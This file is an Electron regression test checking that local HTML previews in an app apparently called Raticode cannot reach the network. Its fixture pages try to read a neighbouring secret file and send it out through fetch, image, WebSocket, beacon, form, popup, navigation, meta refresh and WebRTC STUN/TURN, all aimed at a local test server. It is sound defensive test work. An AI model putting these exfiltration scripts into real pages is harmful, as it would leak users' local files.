// Local HTML previews are offline, end to end on real Electron. A report in a
// project folder that reads a file next to it and tries every common way to
// send it out (fetch, an image, a beacon, a WebSocket, a form, going to a
// website, opening one) reaches nothing. A file allowed to load remote content
// shows its remote picture. A file another app opened runs no scripts, and a
// link the user clicks in it still opens in a Browser tab.
// Runs on a hidden display with its own profile.
require("./background-display.cjs").runInBackgroundDisplay();
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { pathToFileURL } = require("node:url");
const http = require("node:http");
const net = require("node:net");
const dgram = require("node:dgram");
const electron = require("electron");
const { app, BrowserWindow } = electron;
const { createBrowserSessions } = require("../browser-sessions.cjs");
const { createBrowserStore } = require("../browser-store.cjs");
const { PARTITIONS } = require("../browser-policy.cjs");

const profile = fs.mkdtempSync(path.join(os.tmpdir(), "raticode-preview-offline-test-"));
const project = path.join(profile, "project");
const downloads = path.join(profile, "Downloads");
fs.mkdirSync(project);
fs.mkdirSync(downloads);
app.setPath("userData", profile);
app.disableHardwareAcceleration();
app.commandLine.appendSwitch("no-sandbox");
app.commandLine.appendSwitch("disable-dev-shm-usage");
const timer = setTimeout(() => finish(new Error("Preview offline test timed out")), 90000);

// A 1x1 PNG.
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

let server;
const received = [];
function finish(error) {
  clearTimeout(timer);
  server?.close();
  try { fs.rmSync(profile, { recursive: true, force: true }); } catch { /* test-tmp removes the run folder. */ }
  if (error) console.error(error);
  else console.log("Preview offline regression passed.");
  app.exit(error ? 1 : 0);
}

async function waitFor(check, label, timeoutMs = 10000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await check();
    if (value) return value;
    if (Date.now() > deadline) throw new Error(`Timed out waiting for ${label}`);
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
}

const settle = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

app.whenReady().then(async () => {
  server = http.createServer((request, response) => {
    received.push(`${request.method} ${request.url}`);
    if (request.url.startsWith("/picture.png")) {
      response.setHeader("Content-Type", "image/png");
      response.end(PNG);
      return;
    }
    response.end("ok");
  });
  server.on("upgrade", (request, socket) => { received.push(`UPGRADE ${request.url}`); socket.destroy(); });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const base = `http://127.0.0.1:${server.address().port}`;

  // The secret sits in the report's own folder, which the preview may read.
  fs.writeFileSync(path.join(project, "notes.txt"), "secret-notes");
  fs.writeFileSync(path.join(project, "report.html"), `<!doctype html><title>Report</title>
<form id="form" method="post" action="${base}/form"><input name="data"></form>
<script>
(async () => {
  const data = await (await fetch("notes.txt")).text();
  const sent = encodeURIComponent(data);
  const attempts = [
    fetch("${base}/fetch", { method: "POST", body: data }).then(() => "fetch", () => ""),
    fetch("${base}/no-cors?d=" + sent, { mode: "no-cors" }).then(() => "no-cors", () => ""),
    new Promise((resolve) => { const image = new Image(); image.onload = () => resolve("image"); image.onerror = () => resolve(""); image.src = "${base}/image?d=" + sent; }),
    new Promise((resolve) => { try { const socket = new WebSocket("${base.replace("http", "ws")}/socket?d=" + sent); socket.onopen = () => resolve("socket"); socket.onerror = () => resolve(""); } catch { resolve(""); } }),
  ];
  try { navigator.sendBeacon("${base}/beacon", data); } catch { /* Blocked. */ }
  const reached = (await Promise.all(attempts)).filter(Boolean);
  document.title = "read:" + data + ":reached:" + reached.join(",");
  // Then the ways out that leave the page.
  window.open("${base}/popup?d=" + sent);
  document.querySelector("input").value = data;
  setTimeout(() => document.getElementById("form").submit(), 100);
  setTimeout(() => { location.href = "${base}/navigate?d=" + sent; }, 300);
})();
</script>`);
  fs.writeFileSync(path.join(project, "chart.html"), `<!doctype html><title>Chart</title><img id="picture" src="${base}/picture.png" alt="chart">`);
  // A page another app handed over, with a link the user clicks.
  fs.writeFileSync(path.join(downloads, "page.html"), `<!doctype html><title>Saved page</title>
<script>document.title = "scripts ran";</script>
<img src="${base}/external.png" alt="">
<a id="link" href="${base}/clicked" style="position:fixed;left:0;top:0;width:300px;height:150px;display:block;background:#ccc">Open the website</a>`);

  const grants = new Map([["project", project], ["downloads", downloads]]);
  const resolvePath = (target, { grantId } = {}) => {
    if (!fs.existsSync(target)) throw new Error(`Path does not exist: ${target}`);
    const allowed = grants.get(grantId);
    if (grantId !== undefined && (!allowed || path.relative(allowed, target).startsWith(".."))) throw new Error("Outside the granted folder");
    return target;
  };

  const window = new BrowserWindow({ width: 1000, height: 700, show: true, webPreferences: { contextIsolation: true } });
  await window.loadURL("data:text/html,<body style='margin:0'>");
  const sent = [];
  const owner = window.webContents;
  const send = owner.send.bind(owner);
  owner.send = (channel, payload) => { sent.push([channel, payload]); send(channel, payload); };
  const store = createBrowserStore(path.join(profile, "browser"), { writeDelayMs: 0 });
  const logs = [];
  const browsers = createBrowserSessions({
    app,
    Menu: electron.Menu,
    clipboard: electron.clipboard,
    dialog: electron.dialog,
    shell: electron.shell,
    session: electron.session,
    getMainWindow: () => window,
    resolvePath,
    store,
    log: (level, message) => logs.push([level, message]),
    quarantineDir: path.join(profile, "browser", "quarantine"),
    WebContentsView: electron.WebContentsView,
    preloadPath: path.join(__dirname, "..", "browser-preload.cjs"),
  });
  browsers.install();
  const event = { sender: owner };
  const statesOf = (id) => sent.filter(([channel, payload]) => channel === "gofer:browser-state" && payload?.id === id).map(([, payload]) => payload);
  const guestIn = (partition, file) => electron.webContents.getAllWebContents().find((contents) => !contents.isDestroyed()
    && contents.session === electron.session.fromPartition(partition) && contents.getURL() === pathToFileURL(file).href && !contents.isLoading());
  const openTabs = () => sent.filter(([channel]) => channel === "gofer:browser-open-tab").map(([, payload]) => payload);

  async function openPreview(file, options = {}) {
    const before = new Set(electron.webContents.getAllWebContents().map((contents) => contents.id));
    const state = browsers.createBrowser(event, { path: file, ...options });
    const guest = electron.webContents.getAllWebContents().find((contents) => !before.has(contents.id) && contents.getType() === "window");
    browsers.browserAction(event, { action: "adopt", id: state.id, webContentsId: -1 });
    browsers.browserAction(event, { action: "place", id: state.id, x: 0, y: 0, width: 1000, height: 600, visible: true });
    await waitFor(() => guest.getURL().startsWith("file:") && !guest.isLoading(), `${path.basename(file)} to load`);
    return { id: state.id, guest };
  }

  // 1. A project report reads a file in its folder and can't send it anywhere.
  const report = await openPreview(path.join(project, "report.html"), { grantId: "project" });
  const title = await waitFor(() => (report.guest.getTitle().startsWith("read:") ? report.guest.getTitle() : ""), "the report's script");
  assert.equal(title, "read:secret-notes:reached:", "the report read its folder but reached nothing");
  await settle(1500);
  assert.deepEqual(received, [], "the preview sent something to the server");
  assert.ok(report.guest.getURL().endsWith("/report.html"), `the preview left its file: ${report.guest.getURL()}`);
  assert.deepEqual(openTabs(), [], "a page script opened a Browser tab");
  const reportState = statesOf(report.id).at(-1);
  assert.equal(reportState.remoteContent.allowed, false);
  assert.ok(reportState.remoteContent.blocked > 0, "the blocked requests are counted for the bar");

  // 2. A file allowed to load remote content shows its remote picture, and the
  // choice is remembered for that file.
  const chartPath = path.join(project, "chart.html");
  const chart = await openPreview(chartPath, { grantId: "project" });
  await waitFor(() => statesOf(chart.id).some((state) => state.remoteContent?.blocked > 0), "the chart's blocked picture");
  assert.equal(await chart.guest.executeJavaScript("document.getElementById('picture').naturalWidth"), 0);
  assert.deepEqual(received, []);
  browsers.browserAction(event, { action: "preview-remote", id: chart.id, allowed: true });
  // The tab moves to the online profile: a new view showing the same file.
  chart.guest = await waitFor(() => guestIn(PARTITIONS.previewOnline, chartPath), "the chart in the online profile");
  await waitFor(() => statesOf(chart.id).at(-1)?.remoteContent?.allowed === true, "the chart's allowed state");
  await waitFor(async () => (await chart.guest.executeJavaScript("document.getElementById('picture')?.complete && document.getElementById('picture').naturalWidth")) === 1, "the remote picture");
  assert.deepEqual(received, ["GET /picture.png"]);
  assert.equal(store.previewRemoteAllowed(chartPath), true);
  // The report next to it is still offline.
  assert.equal(store.previewRemoteAllowed(path.join(project, "report.html")), false);
  // A new preview of the same file loads it straight away.
  const again = await openPreview(chartPath, { grantId: "project" });
  await waitFor(async () => (await again.guest.executeJavaScript("document.getElementById('picture')?.complete && document.getElementById('picture').naturalWidth")) === 1, "the remembered picture");
  browsers.browserAction(event, { action: "close", id: again.id });
  // Blocking it again goes back to offline.
  received.length = 0;
  browsers.browserAction(event, { action: "preview-remote", id: chart.id, allowed: false });
  chart.guest = await waitFor(() => guestIn(PARTITIONS.preview, chartPath), "the chart back in the offline profile");
  await waitFor(() => !chart.guest.isLoading(), "the chart to reload");
  await settle(500);
  assert.equal(await chart.guest.executeJavaScript("document.getElementById('picture').naturalWidth"), 0);
  assert.deepEqual(received, []);

  // 3. A file another app opened runs no scripts, loads nothing, can't be
  // allowed online, and a link the user clicks opens in a Browser tab.
  received.length = 0;
  const external = await openPreview(path.join(downloads, "page.html"), { grantId: "downloads", external: true });
  await settle(500);
  assert.equal(external.guest.getTitle(), "Saved page", "a script ran in a file from another app");
  assert.deepEqual(received, [], "a file from another app reached the network");
  assert.equal(statesOf(external.id).at(-1).external, true);
  assert.throws(() => browsers.browserAction(event, { action: "preview-remote", id: external.id, allowed: true }), /never load remote content/);
  // Ask Rem still reads the page: Raticode's own reader runs with page scripts off.
  const context = await Promise.race([browsers.browserAction(event, { action: "page-context", id: external.id }), settle(5000).then(() => null)]);
  assert.match(String(context?.text || ""), /Open the website/, "Ask Rem couldn't read a page with scripts off");
  external.guest.focus();
  external.guest.sendInputEvent({ type: "mouseDown", x: 40, y: 40, button: "left", clickCount: 1 });
  external.guest.sendInputEvent({ type: "mouseUp", x: 40, y: 40, button: "left", clickCount: 1 });
  const opened = await waitFor(() => openTabs().at(-1), "the clicked link's Browser tab");
  assert.equal(opened.url, `${base}/clicked`);
  assert.ok(external.guest.getURL().endsWith("/page.html"), "the preview itself went to the website");
  await settle(300);
  assert.deepEqual(received, [], "the click reached the website from the preview's profile");

  // 3b. Only a real link click leaves a preview. A click anywhere else gives
  // the page's scripts, or a scripts-off file's meta refresh, nothing.
  const click = (guest, x, y) => {
    guest.focus();
    guest.sendInputEvent({ type: "mouseDown", x, y, button: "left", clickCount: 1 });
    guest.sendInputEvent({ type: "mouseUp", x, y, button: "left", clickCount: 1 });
  };
  const tabsBefore = openTabs().length;
  fs.writeFileSync(path.join(project, "anywhere.html"), `<!doctype html><title>Anywhere</title>
<div style="position:fixed;inset:0;background:#eee">Click anywhere</div>
<script>
document.addEventListener("mousedown", () => {
  window.open("${base}/popup-on-click?d=secret-notes");
  location.href = "${base}/navigate-on-click?d=secret-notes";
});
</script>`);
  const anywhere = await openPreview(path.join(project, "anywhere.html"), { grantId: "project" });
  click(anywhere.guest, 200, 200);
  await settle(1500);
  assert.deepEqual(openTabs().slice(tabsBefore), [], "a click outside a link let the page open a website");
  assert.ok(anywhere.guest.getURL().endsWith("/anywhere.html"), `the preview left its file: ${anywhere.guest.getURL()}`);
  fs.writeFileSync(path.join(downloads, "refresh.html"), `<!doctype html><title>Refresh</title>
<meta http-equiv="refresh" content="1;url=${base}/refresh?d=opened">
<div style="position:fixed;inset:0;background:#eee">Click anywhere</div>`);
  const refresh = await openPreview(path.join(downloads, "refresh.html"), { grantId: "downloads", external: true });
  click(refresh.guest, 200, 200);
  await settle(2500);
  assert.deepEqual(openTabs().slice(tabsBefore), [], "a meta refresh right after a click opened a website");
  assert.deepEqual(received, [], "a click outside a link reached the website");

  // 4. Routes the request guard never sees: WebRTC (STUN over UDP, TURN over
  // TCP) and a preconnect hint reach nothing from an offline preview.
  const reached = [];
  const udp = dgram.createSocket("udp4");
  udp.on("message", () => reached.push("stun"));
  await new Promise((resolve) => udp.bind(0, "127.0.0.1", resolve));
  const turn = net.createServer((socket) => { reached.push("turn"); socket.destroy(); });
  await new Promise((resolve) => turn.listen(0, "127.0.0.1", resolve));
  const hint = net.createServer((socket) => { reached.push("preconnect"); socket.destroy(); });
  await new Promise((resolve) => hint.listen(0, "127.0.0.1", resolve));
  const routesPage = (name) => {
    fs.writeFileSync(path.join(project, name), `<!doctype html><title>Routes</title>
<link rel="preconnect" href="http://127.0.0.1:${hint.address().port}">
<script>
(async () => {
  try {
    const peer = new RTCPeerConnection({ iceServers: [
      { urls: "stun:127.0.0.1:${udp.address().port}" },
      { urls: "turn:127.0.0.1:${turn.address().port}?transport=tcp", username: "secret-notes", credential: "x" },
    ] });
    peer.createDataChannel("out");
    await peer.setLocalDescription(await peer.createOffer());
    await new Promise((resolve) => setTimeout(resolve, 2500));
    document.title = "routes:" + peer.iceGatheringState;
  } catch (error) { document.title = "routes:refused:" + error.name; }
})();
</script>`);
    return path.join(project, name);
  };
  try {
    const routes = await openPreview(routesPage("routes.html"), { grantId: "project" });
    await waitFor(() => routes.guest.getTitle().startsWith("routes:"), "the routes page's script", 15000);
    await settle(1000);
    assert.deepEqual(reached, [], `an offline preview reached the network outside the request guard (${routes.guest.getTitle()})`);
    browsers.browserAction(event, { action: "close", id: routes.id });
    // The same page allowed online still reaches its servers, so the check above means something.
    const onlinePath = routesPage("routes-online.html");
    store.setPreviewRemote(onlinePath, true);
    const online = await openPreview(onlinePath, { grantId: "project" });
    await waitFor(() => online.guest.getTitle().startsWith("routes:"), "the online routes page's script", 15000);
    await waitFor(() => reached.includes("stun"), "WebRTC from a page allowed online", 5000);
  } finally {
    udp.close();
    turn.close();
    hint.close();
  }

  finish();
}).catch(finish);
